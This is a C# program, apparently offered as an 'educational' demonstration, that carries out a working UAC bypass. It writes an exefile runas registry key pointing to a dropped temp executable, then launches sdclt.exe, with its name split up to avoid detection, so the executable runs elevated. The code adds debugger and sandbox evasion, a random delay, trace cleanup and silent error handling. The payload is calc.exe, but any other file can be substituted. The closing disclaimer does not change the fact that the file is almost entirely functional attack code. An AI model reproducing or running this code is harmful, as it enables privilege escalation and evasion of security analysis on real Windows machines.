using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace EduAPT
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        static void Main(string[] args)
        {
            // Delay for a random period between 3 and 7 seconds to simulate real-world execution
            Thread.Sleep(new Random().Next(3000, 7000));

            // Check if the program is running in a sandbox environment
            if (IsSandbox()) return;

            // Registry path used for the bypass technique
            string regPath = @"Software\Classes\exefile\shell\runas\command";

            try
            {
                // Simulated fileless mode: creates a temporary executable on disk and removes it afterwards
                string tempPayload = Path.Combine(Path.GetTempPath(), "mstsk.tmp.exe");
                ExtractCalcToTemp(tempPayload);

                // Creation of the bypass registry key
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                {
                    string cmd = $"\"{tempPayload}\"";
                    key.SetValue("", cmd, RegistryValueKind.String);
                    key.SetValue("IsolatedCommand", cmd, RegistryValueKind.String);
                }

                Thread.Sleep(1000);

                // Constructing the filename for sdclt.exe
                string sdclt = "s" + "d" + "c" + "l" + "t" + ".exe";
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = sdclt,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                // Start the sdclt.exe process, which will trigger the bypass
                Process.Start(psi);

                // Wait for 4 seconds to allow the payload to execute
                Thread.Sleep(4000);

                // Reverting the registry key after execution
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\exefile", false);

                // Removing the temporary executable file
                if (File.Exists(tempPayload))
                    File.Delete(tempPayload);
            }
            catch
            {
                // Silent failure (intended for educational purposes only)
            }
        }

        static bool IsSandbox()
        {
            // Check if a debugger is attached
            if (IsDebuggerPresent()) return true;

            // Check for common sandbox usernames
            string user = Environment.UserName.ToLower();
            string machine = Environment.MachineName.ToLower();
            if (user.Contains("analyst") || user.Contains("sandbox")) return true;

            // Check for common sandbox machine names
            if (machine.Contains("winvm") || machine.Contains("maltest")) return true;

            return false;
        }

        static void ExtractCalcToTemp(string outputPath)
        {
            // This function simulates extracting a payload (in this case, calc.exe for simplicity)
            // to a temporary location. In a real-world scenario, this could be a more malicious payload.
            try
            {
                string source = Path.Combine(Environment.SystemDirectory, "calc.exe");
                File.Copy(source, outputPath, true);
            }
            catch
            {
                // Silent failure (intended for educational purposes only)
            }
        }
    }
}

// **Important Note:**
// This code is provided for educational purposes only to demonstrate a potential bypass technique.
// Any use of this code for malicious or unauthorized activities is strictly wrong and unethical.
// This script simulates a fileless execution by creating and then deleting a temporary executable.
// It also attempts to bypass User Account Control (UAC) using a registry key manipulation technique.
// The payload used in this example is 'calc.exe' for demonstration purposes.
// Real-world malicious payloads would be significantly different and harmful.
// The sandbox detection mechanisms are basic and can be bypassed by more sophisticated environments.
